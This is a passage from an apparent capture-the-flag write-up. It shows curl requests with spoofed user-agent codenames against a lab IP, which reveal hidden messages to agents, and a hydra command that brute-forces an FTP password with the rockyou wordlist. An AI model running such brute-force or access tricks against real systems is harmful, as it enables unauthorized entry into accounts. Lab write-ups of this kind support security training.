2. How you redirect yourself to a secret page? 

```
Use your own codename as user-agent to access the site 
```

3. What is the agent name? 

```bash
$ curl -A "R" -L 10.10.31.105
What are you doing! Are you one of the 25 employees? If not, I going to report this incident
<!DocType html>

<body>
<p>
	Dear agents,
	<br><br>
	Use your own <b>codename</b> as user-agent to access the site.
	<br><br>
	From,<br>
	Agent R
</p>
</body>
</html>

```

```bash
$ curl -A "C" -L 10.10.31.105
Attention chris, <br><br>

Do you still remember our deal? Please tell agent J about the stuff ASAP. Also, change your god damn password, is weak! <br><br>

From,<br>
Agent R 
```
Using curl with -A to spoof the user-agent and -L to follow any redirects 

R is a valid codename but not the one we are searching for. Since there are 25 Employees the codenames probably follow the alphabet

## Hash cracking and brute-force

1. FTP password 

```bash
$ hydra -l chris -P /usr/share/wordlists/rockyou.txt 10.10.31.105 ftp

Dear agent J,

All these alien like photos are fake! Agent R stored the real picture inside your directory. Your login password is somehow stored in the fake picture. It shouldn't be a problem for you.
